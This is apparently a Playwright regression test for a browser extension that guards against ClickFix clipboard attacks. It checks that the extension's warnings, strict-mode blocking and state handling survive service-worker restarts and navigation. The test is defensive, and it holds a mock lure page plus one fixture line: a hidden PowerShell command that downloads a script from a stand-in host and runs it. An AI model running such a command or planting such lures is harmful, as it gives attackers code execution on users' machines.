// Issue #29 browser regression.
//
// This loads the production MV3 extension in Chromium. No chrome.tabs,
// webNavigation, storage, or runtime edge is mocked: each scenario stops the
// extension service worker, lets the protected clipboard call restart it, and
// observes the real staged tab, committed warning document, durable state, and
// extension-owned clipboard write.

import assert from "node:assert/strict";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { chromium } from "../../Extension/node_modules/playwright/index.mjs";

const BUILD_ROOT = fileURLToPath(new URL("../../build/extension/", import.meta.url));
const SOURCE_ORIGIN = "https://source.yodel-phish.test";
const SOURCE_URL = SOURCE_ORIGIN + "/setup";
const REPLACED_URL = SOURCE_ORIGIN + "/replaced";
const CLICKFIX_TEXT = "powershell -w hidden iwr https://payload.test/a.ps1 | iex";
const WARNING_STATE_KEY = "clickfix_warning_sessions";

const SOURCE_PAGE = `<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Setup instructions</title></head>
<body>
  <h1>Setup instructions</h1>
  <button id="copy" type="button">Copy command</button>
  <script>
    const command = ${JSON.stringify(CLICKFIX_TEXT)};
    document.getElementById("copy").addEventListener("click", () => {
      window.__copySettlement = "pending";
      const writing = navigator.clipboard.writeText(command);
      if (new URL(location.href).searchParams.has("history")) {
        history.pushState({ step: 2 }, "", "/setup?history=1&step=2");
      }
      writing.then(
        () => { window.__copySettlement = "resolved"; },
        (error) => {
          window.__copySettlement = "rejected";
          window.__copyError = String(error);
        }
      );
    });
  </script>
</body>
</html>`;

function recordFirstVisibleWarning() {
  window.__ypVisibleWarnings = [];
  const sample = () => {
    const card = document.querySelector(".yp-card");
    if (card !== null) {
      const style = getComputedStyle(card);
      const text = style.visibility === "hidden" || style.display === "none"
        ? ""
        : (document.body.innerText ?? "").replace(/\s+/g, " ").trim();
      const samples = window.__ypVisibleWarnings;
      if (text !== "" && samples.at(-1) !== text) samples.push(text);
    }
    requestAnimationFrame(sample);
  };
  requestAnimationFrame(sample);
}

async function waitForExtensionWorker(context, extensionId = null) {
  const matches = (worker) => {
    const url = new URL(worker.url());
    return url.protocol === "chrome-extension:" &&
      (extensionId === null || url.host === extensionId);
  };
  const existing = context.serviceWorkers().find(matches);
  if (existing !== undefined) return existing;
  return context.waitForEvent("serviceworker", { predicate: matches, timeout: 15_000 });
}

async function configureAndStopWorker(context, sourcePage, extensionId, mode) {
  const worker = await waitForExtensionWorker(context, extensionId);
  await worker.evaluate(async (selectedMode) => {
    const current = await chrome.storage.local.get("settings");
    await chrome.storage.local.set({
      settings: {
        ...(current.settings ?? {}),
        developer_mode: true,
        clickfix: { mode: selectedMode, excluded_domains: [] },
      },
    });
    await chrome.storage.session.clear();
    await chrome.alarms.clearAll();
  }, mode);

  const cdp = await context.newCDPSession(sourcePage);
  let currentVersion = null;
  const versionChanged = new Promise((resolve) => {
    cdp.on("ServiceWorker.workerVersionUpdated", ({ versions }) => {
      const matching = versions.find((version) =>
        version.scriptURL === worker.url() && version.status === "activated"
      );
      if (matching !== undefined) {
        currentVersion = matching;
        resolve();
      }
    });
  });
  await cdp.send("ServiceWorker.enable");
  if (currentVersion === null) {
    await Promise.race([
      versionChanged,
      new Promise((_, reject) => setTimeout(
        () => reject(new Error("Could not resolve the extension service-worker version")),
        10_000
      )),
    ]);
  }
  assert.notEqual(currentVersion, null);
  await cdp.send("ServiceWorker.stopWorker", { versionId: currentVersion.versionId });

  const deadline = Date.now() + 10_000;
  while (currentVersion.runningStatus !== "stopped" && Date.now() < deadline) {
    await new Promise((resolve) => setTimeout(resolve, 25));
  }
  await cdp.send("ServiceWorker.disable");
  await cdp.detach();
  assert.equal(
    currentVersion.runningStatus,
    "stopped",
    "the clipboard event must start from a stopped MV3 worker"
  );
  return worker;
}

async function newProtectedSource(context, url = SOURCE_URL) {
  const page = await context.newPage();
  await page.goto(url);
  await page.bringToFront();
  await page.waitForSelector("#copy");
  return page;
}

async function triggerWarning(context, sourcePage) {
  const existing = new Set(context.pages());
  const created = context.waitForEvent("page", {
    predicate: (page) => !existing.has(page),
    timeout: 15_000,
  });
  await sourcePage.click("#copy");
  const warningPage = await created;
  const staging = {
    url: warningPage.url(),
    visibility: await warningPage.evaluate(() => document.visibilityState).catch(() => "unknown"),
    text: await warningPage.evaluate(() => document.body?.innerText ?? "").catch(() => ""),
  };
  return { warningPage, staging };
}

async function waitForCommittedWarning(context, warningPage, extensionId, stoppedWorker) {
  await warningPage.waitForURL((url) =>
    url.protocol === "chrome-extension:" &&
    url.host === extensionId &&
    url.pathname === "/interstitial/clickfix.html" &&
    url.searchParams.get("kind") === "clickfix" &&
    typeof url.searchParams.get("request") === "string",
  { timeout: 15_000 });

  const requestId = new URL(warningPage.url()).searchParams.get("request");
  const restartedWorker = await waitForExtensionWorker(context, extensionId);
  // Playwright keeps one Worker wrapper for an extension registration across
  // stopped/running CDP versions. configureAndStopWorker already asserted the
  // activated version reached runningStatus "stopped"; reaching this committed
  // page proves the clipboard event started that registration again.
  assert.equal(restartedWorker.url(), stoppedWorker.url());

  const state = await restartedWorker.evaluate(async (key) => {
    const stored = await chrome.storage.session.get(key);
    return stored[key] ?? null;
  }, WARNING_STATE_KEY);
  const record = state?.warnings_by_id?.[requestId] ?? null;
  assert.notEqual(record, null, "state exists when the warning document commits");
  assert.equal(record.status, "active", "tabs.update alone never marks the warning active");

  await warningPage.waitForFunction(
    () => (window.__ypVisibleWarnings ?? []).length > 0,
    null,
    { timeout: 15_000 }
  );
  return { requestId, record, worker: restartedWorker };
}

async function assertWarningPresentation(warningPage, staging, expectedHeading) {
  assert.equal(staging.url, "about:blank", "the real target first exists at the staging URL");
  // Headless Chromium reports every page target as visible, even when chrome.tabs
  // created it with active:false. The real about:blank target and empty paint are
  // observable here; inactive creation is asserted at the lifecycle API boundary.
  assert.equal(staging.text.trim(), "", "the staging document exposes no transient UI");

  const visible = await warningPage.evaluate(() => window.__ypVisibleWarnings);
  assert.ok(visible.length > 0);
  assert.match(visible[0], new RegExp(expectedHeading));
  assert.match(visible[0], /source\.yodel-phish\.test/);
  assert.match(visible[0], /powershell -w hidden/);
  for (const sample of visible) {
    assert.doesNotMatch(sample, /Deceptive site ahead|impersonating/i);
    assert.doesNotMatch(sample, /Clipboard request expired|No active/i);
  }
  assert.match(await warningPage.title(), /Clipboard warning/);
}

async function closeWarning(warningPage) {
  const closed = warningPage.waitForEvent("close", { timeout: 10_000 });
  await warningPage.click("#yp-btn-close");
  await closed;
}

const profileDir = await mkdtemp(join(tmpdir(), "yodel-clickfix-mv3-"));
const configuredExecutable = process.env.PLAYWRIGHT_CHROMIUM_EXECUTABLE_PATH;
const context = await chromium.launchPersistentContext(profileDir, {
  headless: true,
  ...(configuredExecutable
    ? { executablePath: configuredExecutable }
    : { channel: "chromium" }),
  args: [
    `--disable-extensions-except=${BUILD_ROOT}`,
    `--load-extension=${BUILD_ROOT}`,
  ],
});
await context.addInitScript(recordFirstVisibleWarning);
await context.grantPermissions(["clipboard-read", "clipboard-write"], { origin: SOURCE_ORIGIN });
await context.route(SOURCE_ORIGIN + "/**", (route) =>
  route.fulfill({ status: 200, contentType: "text/html", body: SOURCE_PAGE })
);

try {
  const initialWorker = await waitForExtensionWorker(context);
  const extensionId = new URL(initialWorker.url()).host;

  // Warn mode: real cold start, staged hidden target, durable active-at-commit
  // record, first-paint verdict, two-step approval, and exact clipboard value.
  {
    const source = await newProtectedSource(context);
    const stopped = await configureAndStopWorker(context, source, extensionId, "warn");
    const { warningPage, staging } = await triggerWarning(context, source);
    await waitForCommittedWarning(context, warningPage, extensionId, stopped);
    await assertWarningPresentation(warningPage, staging, "Potentially dangerous command");

    await warningPage.click("#yp-btn-proceed");
    assert.match(await warningPage.innerText("#yp-btn-proceed"), /^Confirm/);
    const closed = warningPage.waitForEvent("close", { timeout: 10_000 });
    await warningPage.click("#yp-btn-proceed");
    await closed;
    await source.bringToFront();
    assert.equal(
      await source.evaluate(() => navigator.clipboard.readText()),
      CLICKFIX_TEXT,
      "approval writes the untouched classified value"
    );
    await source.close();
  }

  // Strict mode uses the same lifecycle and has no bypass.
  {
    const source = await newProtectedSource(context);
    const stopped = await configureAndStopWorker(context, source, extensionId, "strict");
    const { warningPage, staging } = await triggerWarning(context, source);
    await waitForCommittedWarning(context, warningPage, extensionId, stopped);
    await assertWarningPresentation(warningPage, staging, "Dangerous command blocked");
    assert.equal(await warningPage.locator("#yp-btn-proceed").isVisible(), false);
    await closeWarning(warningPage);
    await source.close();
  }

  // Back to about:blank revokes active state even when Chrome restores the
  // original staged document; Forward can no longer reuse that request.
  {
    const source = await newProtectedSource(context);
    const stopped = await configureAndStopWorker(context, source, extensionId, "warn");
    const { warningPage, staging } = await triggerWarning(context, source);
    const { worker } = await waitForCommittedWarning(
      context, warningPage, extensionId, stopped
    );
    await assertWarningPresentation(warningPage, staging, "Potentially dangerous command");

    await warningPage.goBack();
    await warningPage.waitForURL("about:blank");
    const stateAfterBack = await worker.evaluate(async (key) => {
      const stored = await chrome.storage.session.get(key);
      return stored[key] ?? null;
    }, WARNING_STATE_KEY);
    assert.equal(Object.keys(stateAfterBack?.warnings_by_id ?? {}).length, 0);

    const closed = warningPage.waitForEvent("close", { timeout: 10_000 });
    await warningPage.goForward().catch(() => {});
    await closed;
    await source.close();
  }

  // A History API update during setup retains the exact source document.
  {
    const source = await newProtectedSource(context, SOURCE_URL + "?history=1");
    const stopped = await configureAndStopWorker(context, source, extensionId, "warn");
    const { warningPage, staging } = await triggerWarning(context, source);
    await waitForCommittedWarning(context, warningPage, extensionId, stopped);
    await assertWarningPresentation(warningPage, staging, "Potentially dangerous command");
    assert.match(source.url(), /step=2/);
    await closeWarning(warningPage);
    await source.close();
  }

  // Replacing the source document as soon as the real hidden target exists
  // cancels setup: no ClickFix document commits and the staging tab disappears.
  {
    const source = await newProtectedSource(context);
    const stopped = await configureAndStopWorker(context, source, extensionId, "warn");
    const { warningPage, staging } = await triggerWarning(context, source);
    assert.equal(staging.url, "about:blank");
    const warningNavigations = [];
    warningPage.on("framenavigated", (frame) => {
      if (frame === warningPage.mainFrame()) warningNavigations.push(frame.url());
    });
    await source.goto(REPLACED_URL);
    await warningPage.waitForEvent("close", { timeout: 15_000 });
    assert.equal(
      warningNavigations.some((url) => url.includes("/interstitial/clickfix.html")),
      false,
      "a replaced source document cannot reveal its old warning"
    );

    const worker = await waitForExtensionWorker(context, extensionId);
    assert.equal(worker.url(), stopped.url());
    const state = await worker.evaluate(async (key) => {
      const stored = await chrome.storage.session.get(key);
      return stored[key] ?? null;
    }, WARNING_STATE_KEY);
    assert.equal(Object.keys(state?.warnings_by_id ?? {}).length, 0);
    await source.close();
  }
} finally {
  await context.close();
  await rm(profileDir, { recursive: true, force: true });
}
